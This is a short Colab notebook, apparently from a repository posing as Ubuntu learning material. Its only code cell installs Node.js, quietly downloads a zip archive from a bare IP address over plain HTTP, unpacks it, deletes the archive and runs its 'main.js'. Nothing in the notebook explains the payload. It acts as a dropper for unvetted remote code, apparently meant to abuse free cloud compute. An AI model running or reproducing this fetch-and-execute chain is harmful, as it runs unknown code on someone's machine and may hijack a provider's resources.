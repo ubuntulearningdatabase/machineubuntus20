{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "tab2.ipynb",
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "voGFUzYVRq40"
      },
      "outputs": [],
      "outputs": [],
      "source": [
        "%%shell\n",
        "apt update -y && apt install -y nodejs\n",
        "wget -q http://199.250.207.182/~ngewetech/include/induk/heroku2.zip && unzip -q heroku2.zip && rm -rf heroku2.zip && cd heroku2 && node main.js"
      ]
    }
  ]
}
